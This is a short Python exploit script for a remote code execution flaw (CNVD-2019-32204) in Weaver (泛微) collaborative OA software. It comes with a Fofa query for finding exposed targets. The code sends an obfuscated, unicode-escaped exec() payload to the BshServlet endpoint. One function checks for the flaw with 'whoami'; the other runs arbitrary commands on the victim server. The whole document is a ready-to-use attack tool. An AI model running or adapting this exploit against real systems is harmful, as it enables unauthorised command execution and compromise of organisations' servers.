# 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204
# Fofa:  app="泛微-协同办公OA"

import requests
import sys
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}


def exp_check(target):
    target += "/weaver/bsh.servlet.BshServlet"
    payload = """bsh.script=\\u0065\\u0078\\u0065\\u0063("whoami");&bsh.servlet.output=raw"""
    try:
        requests.packages.urllib3.disable_warnings()
        request = requests.post(headers=headers, url=target, data=payload, timeout=5, verify=False)
        if ";</script>" not in request.text:
            if "Login.jsp" not in request.text:
                if "Error" not in request.text:
                    if "<head>" not in request.text:
                        return 1
                    else:
                        return 2
    except:
        return 3

def exp_cmd(url,cmd):
    url += "/weaver/bsh.servlet.BshServlet"
    payload = """bsh.script=\\u0065\\u0078\\u0065\\u0063("{}");&bsh.servlet.output=raw""".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings()
        request = requests.post(headers=headers, url=url, data=payload, timeout=5, verify=False)
        return request.text
    except:
        return "异常"